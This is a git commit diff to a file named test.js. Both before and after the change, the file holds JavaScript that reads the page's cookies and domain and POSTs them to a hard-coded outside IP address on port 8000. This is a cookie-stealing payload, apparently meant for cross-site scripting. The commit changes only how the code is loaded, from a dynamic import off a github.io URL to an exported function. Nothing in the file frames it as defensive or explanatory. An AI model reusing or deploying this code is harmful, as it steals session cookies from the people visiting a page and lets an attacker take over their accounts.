7cb183b342c823dd7fc3c4a4c40bda895ab22c45
BTtea <32271123+BTtea@users.noreply.github.com>
2024-02-07 08:57:12 +0800

    Add files via upload

--- test.js
+++ test.js
@@ -1,8 +1,8 @@
-import('https://bttea.github.io/b.js').then(function(abc) {
+export function a() {
     data = new FormData();
     data.set('get_cookie',document.cookie);
     data.set('get_ip',document.domain);
     let request = new XMLHttpRequest();
     request.open('POST','http://140.116.2.44:8000/',true);
     request.send(data);
-});
+}
